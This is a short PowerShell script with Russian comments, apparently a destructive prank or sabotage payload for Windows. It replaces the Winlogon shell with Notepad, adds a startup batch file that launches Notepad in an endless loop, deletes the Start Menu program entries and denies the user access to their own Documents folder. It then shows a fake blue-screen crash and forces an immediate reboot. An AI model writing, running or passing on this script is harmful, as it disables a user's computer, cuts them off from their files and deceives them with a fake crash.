# 1. Отключение рабочего стола
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "notepad.exe"

# 2. Бесконечный запуск Блокнота при старте
$batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\breaker.bat"
$batCode = '@echo off
:loop
start notepad
goto loop'
Set-Content -Path $batPath -Value $batCode -Encoding ASCII

# 3. Очистка Пуск
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\*" -Recurse -Force -ErrorAction SilentlyContinue

# 4. Блокировка Documents
icacls "$env:USERPROFILE\Documents" /deny "$env:USERNAME":(OI)(CI)F

# 5. Фейковый BSOD
Add-Type -AssemblyName PresentationFramework
$bsod = New-Object -TypeName Window -Property @{
    WindowStyle = 'None'
    ResizeMode = 'NoResize'
    Background = 'DarkBlue'
    WindowStartupLocation = 'CenterScreen'
    Topmost = $true
    Width = [System.Windows.SystemParameters]::PrimaryScreenWidth
    Height = [System.Windows.SystemParameters]::PrimaryScreenHeight
    Content = ":(

Your PC ran into a problem and needs to restart.
Stop code: FAKE_BSOD"
}
$bsod.ShowDialog()

# 6. Ребут
shutdown /r /t 0
